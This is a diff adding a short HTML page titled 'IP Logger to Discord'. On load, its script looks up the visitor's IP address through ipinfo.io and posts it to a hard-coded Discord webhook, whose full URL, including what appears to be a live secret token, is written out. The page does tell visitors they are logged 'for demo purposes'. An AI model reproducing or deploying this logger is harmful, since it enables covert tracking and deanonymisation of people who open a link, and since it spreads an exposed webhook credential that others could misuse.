@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>IP Logger to Discord</title>
+</head>
+<body>
+  <h1>Welcome</h1>
+  <p>Your IP is being logged for demo purposes.</p>
+
+  <script>
+    // 1. Fetch visitor's IP from ipinfo.io
+    fetch("https://ipinfo.io/json?token=YOUR_TOKEN_HERE") // optional token from ipinfo.io
+      .then(response => response.json())
+      .then(data => {
+        const ip = data.ip;
+
+        // 2. Send IP to Discord webhook (⚠️ Not secure!)
+        fetch("https://discord.com/api/webhooks/1359699275289723004/bmW4msaaNzAon3B-JBJ44O0y6JHHyJh5hUtL4Cnre6BIuHYz14CHR9hs8sHvnzh93xs3", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: `New visitor IP: \`${ip}\``
+          })
+        });
+      });
+  </script>
+</body>
+</html>
